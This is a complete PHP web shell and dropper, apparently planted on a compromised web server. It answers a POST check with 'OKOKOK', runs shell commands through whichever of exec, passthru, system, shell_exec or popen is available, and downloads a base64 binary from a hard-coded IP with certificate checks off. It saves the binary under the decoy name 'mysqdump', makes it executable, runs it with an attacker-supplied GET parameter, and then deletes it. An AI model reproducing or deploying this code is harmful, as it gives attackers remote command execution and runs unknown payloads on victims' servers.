<?php /*iueedidaxr eevmo y gagj   */?><?php
if($_SERVER['REQUEST_METHOD'] === 'POST'){
    if (isset($_POST["result"])){
        echo 'OKOKOK';
        exit;
    }
}
function ex($in) {
    $out = '';
    if(function_exists('exec')) {
        @exec($in,$out);
        $out = @join("\n",$out);
    }elseif(function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $out = ob_get_clean();
    }elseif(function_exists('system')) {
        ob_start();
        @system($in);
        $out = ob_get_clean();
    }elseif(function_exists('shell_exec')) {
        $out = shell_exec($in);
    }elseif(is_resource($f = @popen($in,"r"))) {
        $out = "";
        while(!@feof($f))
            $out .= fread($f,1024);
        pclose($f);
    }
    return $out;
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://185.163.46.18/getbinary.php");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLINFO_HEADER_OUT, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch , CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
curl_setopt($ch, CURLOPT_FRESH_CONNECT, TRUE);
curl_setopt($ch,CURLOPT_TIMEOUT,120);
curl_setopt($ch, CURLOPT_HTTPHEADER,     array('Content-Type: text/plain'));
$data = curl_exec($ch);


file_put_contents('mysqdump', base64_decode($data));
ex("chmod +x mysqdump");
echo ex("./mysqdump ".$_GET['id']);
unlink($_SERVER["DOCUMENT_ROOT"]."/mysqdump");
